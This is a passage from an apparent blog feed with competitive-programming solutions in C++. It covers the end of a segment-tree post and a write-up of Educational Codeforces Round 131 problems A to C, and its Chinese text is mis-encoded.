class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,<span class="number">1</span>,num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].r+tree[now].l&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,a+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">signed</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">signed</span> op,l,r,num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">mul</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">add</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;l=%d r=%d\n&quot;,l,r);</span></span><br><span class="line">            <span class="built_in">query</span>(l,r,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç»ƒä¸€ä¸‹çº¿æ®µæ ‘ä¸“é¢˜å§ï¼Œæœ¬ç¯‡åšå®¢æŒç»­æ›´æ–°ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="æ•°æ®ç»“æ„" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="çº¿æ®µæ ‘" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Codeforces Round 131(Div.2)è§£æ</title>
    <link href="http://example.com/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/"/>
    <id>http://example.com/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/</id>
    <published>2022-07-08T16:02:00.000Z</published>
    <updated>2022-07-09T00:59:37.382Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©æ‰å¤§åˆ†ï¼Œé¢„ä¼°å›é’åå§ã€‚å®æ—¶<a href="https://www.bilibili.com/video/BV1KN4y1u7qB">å½•å±</a></p><span id="more"></span><h2 id="A-Grass-Field"><a href="#A-Grass-Field" class="headerlink" title="A. Grass Field"></a>A. Grass Field</h2><h3 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™å®š2Ã—2çš„è‰åœ°ï¼Œä¸€æ¬¡æ“ä½œèƒ½ä»»æ„æ¸…é™¤ä¸‰å—è‰åœ°ï¼Œé—®æœ€å¤šå‡ æ¬¡æ¸…é™¤æ‰€æœ‰è‰åœ°ã€‚é‚£å°±åˆ¤æ–­è‰åœ°ä¸ªæ•°ï¼Œåªæœ‰å…¨æ˜¯è‰åœ°çš„æ—¶å€™æ‰è¦ä¸¤æ¬¡ï¼Œæ²¡æœ‰è‰åœ°çš„æ—¶å€™ä¸€æ¬¡ä¸ç”¨ï¼Œå…¶ä½™æƒ…å†µéƒ½æ˜¯ä¸€æ¬¡ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>,a,a+<span class="number">1</span>,a+<span class="number">2</span>,a+<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span> sum=a[<span class="number">1</span>]+a[<span class="number">2</span>]+a[<span class="number">3</span>]+a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(sum==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum!=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Permutation"><a href="#B-Permutation" class="headerlink" title="B. Permutation"></a>B. Permutation</h2><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦è®©æ’åˆ—ä¸­çš„ä¸€ä¸ªå€¼ï¼ˆè¿™ä¸ªå€¼æ˜¯<code>a[i+1]/a[i]</code>ï¼‰å°½å¯èƒ½å¤šçš„å‡ºç°ï¼Œä¸€æ ·å¤šçš„æƒ…å†µä¸‹è¾“å‡ºå€¼è¾ƒå¤§çš„ã€‚è¿™é¢˜è´ªå°±å®Œäº†ï¼Œæˆ‘ä»¬é•¿åº¦è¶…è¿‡4çš„æˆ‘ä»¬å°±é€‰2ã€‚ä»1å¼€å§‹2å€å»å¡«ä¸Šæ•°ï¼Œå†é€‰æ²¡å¡«è¿‡çš„ï¼Œä¹Ÿæ˜¯2å€2å€è¾“å‡ºï¼Œè¿™æ ·å°±è¾¾åˆ°äº†æœ€ä¼˜çŠ¶æ€ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2\n1 2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3\n2 1 3&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">1</span>)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j*=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,j);</span><br><span class="line">            a[j]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>mä¸ªå·¥ä½œï¼Œnä¸ªäººï¼Œæ¯ä¸ªå·¥ä½œæœ‰ä¸€ä¸ªç†Ÿç»ƒå·¥ï¼Œå¦‚æœè®©ç†Ÿç»ƒå·¥å®Œæˆï¼Œé‚£ä¹ˆåªéœ€è¦ä¸€ä¸ªå°æ—¶ï¼Œè®©å…¶ä½™å·¥äººå®Œæˆéƒ½éœ€è¦ä¸¤ä¸ªå°æ—¶ã€‚</p><p>æˆ‘ä»¬ç›´æ¥äºŒåˆ†ç­”æ¡ˆå°±è¡Œäº†ï¼Œè‡³äºcheckå‡½æ•°ï¼Œæˆ‘ä»¬å°±å…ˆè®¡ç®—æ¯ä¸ªå·¥äººçš„ç†Ÿç»ƒå·¥ä½œä¸ªæ•°ã€‚</p><p>ç„¶ååšå‡ºå¦‚ä¸‹ç®—æ³•ï¼š</p><ol><li>å¯¹äºä¸€ä¸ªäººï¼Œè‹¥å®ƒç†Ÿç»ƒa[i]ç§å·¥ä½œï¼Œé‚£ä¹ˆå®ƒä¼šå°½é‡èŠ±è´¹a[i]çš„æ—¶é—´å»åšå®Œè¿™a[i]çš„å·¥ä½œï¼Œè‹¥æ—¶é—´æœ‰å‰©ï¼Œé‚£ä¹ˆå‰©ä½™æ—¶é—´åš <code>(t-a[i])/2</code> ä¸ªå·¥ä½œã€‚</li><li>åˆ¤æ–­nä¸ªå·¥äººåœ¨tæ—¶é—´å†…æ˜¯å¦èƒ½å®Œæˆmé¡¹å·¥ä½œåªéœ€æŠŠå·¥äººæŒ‰ç…§ä»¥ä¸Šç®—æ³•åŠ èµ·æ¥ï¼Œåˆ¤æ–­ä¸€ä¸‹å¤§å°å°±è¡Œäº†ã€‚</li></ol><p>æ—¶é—´ä¸ŠäºŒåˆ†ï¼Œé€‰æ‹©æœ€å¤§å¯èƒ½æ—¶é—´ï¼Œæœ€å¤§å¯èƒ½æ—¶é—´å°±æ˜¯æŠŠæ‰€æœ‰äººéƒ½å½“åœºä¸ç†Ÿç»ƒå·¥è®¡ç®—å°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;a[%d]=%d\n&quot;,i,a[i]);</span></span><br><span class="line"><span class="comment">//        if(!a[i])&#123;</span></span><br><span class="line"><span class="comment">//            break;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;t)&#123;</span><br><span class="line">            ans+=a[i];</span><br><span class="line">            ans+=(t-a[i])/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;time=%d ans=%d\n&quot;,t,ans);</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[x]++;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    t=(m/n)*<span class="number">2</span>+(!!(m%n))*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=t;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;mid=%d\n&quot;,mid);</span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="built_in">cal</span>(mid);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(res&lt;m)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,l);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å•¥ä¹Ÿä¸è¯´äº†ï¼ŒçŒ›ç»ƒå§ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»Šå¤©æ‰å¤§åˆ†ï¼Œé¢„ä¼°å›é’åå§ã€‚å®æ—¶&lt;a href=&quot;https://www.bilibili.com/video/BV1KN4y1u7qB&quot;&gt;å½•å±&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>codeforces round 804(div2)è§£æ</title>
    <link href="http://example.com/2022/07/05/Codeforces%20Round%20804(Div.2)/"/>
    <id>http://example.com/2022/07/05/Codeforces%20Round%20804(Div.2)/</id>
    <published>2022-07-04T16:01:00.000Z</published>
    <updated>2022-07-04T17:05:35.038Z</updated>
    
